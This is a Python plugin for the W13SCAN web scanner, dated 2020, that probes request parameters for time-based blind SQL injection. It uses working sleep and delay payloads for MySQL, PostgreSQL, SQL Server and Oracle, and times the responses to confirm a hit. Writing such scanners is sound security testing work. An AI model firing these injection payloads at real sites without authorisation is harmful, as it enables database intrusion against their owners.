#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Name: sqli_time.py
Author: Evi1ran
Date Created: November 17, 2020
Description: None
"""

# built-in imports
import time

# third-party imports
from lib.core.common import generateResponse, random_num
from lib.core.enums import PLACE, VulType
from lib.core.plugins import PluginBase


class W13SCAN(PluginBase):
    name = '时间型SQL注入'
    sleep_time = 5
    sleep_str = "[SLEEP_TIME]"
    verify_count = 2

    def generatePayloads(self, payloadTemplate, origin_dict):
        """
        根据payload模板生成时间盲注所需要的不同响应时间的payload
        @param payloadTemplate:
        @param origin_dict:
        @return:
        """
        new_dict = origin_dict.copy()
        zero_dict = origin_dict.copy()
        for k, v in new_dict.items():
            new_dict[k] = v + payloadTemplate.replace(self.sleep_str, str(self.sleep_time))
            # 如果取 2*sleep_time 可能会更准确
            zero_dict[k] = v + payloadTemplate.replace(self.sleep_str, "0")

        return new_dict, zero_dict

    def audit(self):
        num = random_num(4)
        sql_times = {
            "MySQL": (
                " AND SLEEP({})".format(self.sleep_str),
                " AND SLEEP({})--+".format(self.sleep_str),
                "' AND SLEEP({})".format(self.sleep_str),
                "' AND SLEEP({})--+".format(self.sleep_str),
                "' AND SLEEP({}) AND '{}'='{}".format(self.sleep_str, num, num),
                '''" AND SLEEP({}) AND "{}"="{}'''.format(self.sleep_str, num, num)),
            "Postgresql": (
                "AND {}=(SELECT {} FROM PG_SLEEP({}))".format(num, num, self.sleep_str),
                "AND {}=(SELECT {} FROM PG_SLEEP({}))--+".format(num, num, self.sleep_str),
            ),
            "Microsoft SQL Server or Sybase": (
                " waitfor delay '0:0:{}'--+".format(self.sleep_str),
                "' waitfor delay '0:0:{}'--+".format(self.sleep_str),
                '''" waitfor delay '0:0:{}'--+'''.format(self.sleep_str)),
            "Oracle": (
                " and 1= dbms_pipe.receive_message('RDS', {})--+".format(self.sleep_str),
                "' and 1= dbms_pipe.receive_message('RDS', {})--+".format(self.sleep_str),
                '''"  and 1= dbms_pipe.receive_message('RDS', {})--+'''.format(self.sleep_str),
                "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})".format(self.sleep_str),
                "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),{})--+".format(
                    self.sleep_str),
            )
        }
        # 载入处理位置以及原始payload
        iterdatas = self.generateItemdatas()

        # 根据原始payload和位置组合新的payload
        for origin_dict, position in iterdatas:
            if position == PLACE.URI:
                continue
            for dbms_type, _payloads in sql_times.items():
                for payloadTemplate in _payloads:
                    r1 = r0 = None
                    delta = 0
                    flag = 0
                    new_dict, zero_dict = self.generatePayloads(payloadTemplate, origin_dict)
                    for i in range(self.verify_count):
                        start_time = time.perf_counter()
                        r1 = self.req(position, new_dict)
                        if not r1:
                            continue
                        end_time_1 = time.perf_counter()
                        delta1 = end_time_1 - start_time
                        if delta1 > self.sleep_time:
                            r0 = self.req(position, zero_dict)
                            end_time_0 = time.perf_counter()
                            delta0 = end_time_0 - end_time_1
                            if delta1 > delta0 > 0:
                                flag += 1
                                delta = round(delta1 - delta0, 3)
                                continue
                        break

                    if r1 is not None and flag == self.verify_count:
                        result = self.new_result()
                        result.init_info(self.requests.url, "SQL注入", VulType.SQLI)
                        for key, payload in new_dict.items():
                            result.add_detail("payload探测", r1.reqinfo, generateResponse(r1),
                                              "DBMS_TYPE:{}，时间相差:{}s".format(dbms_type, delta), key, payload,
                                              position)
                        self.success(result)
                        return True
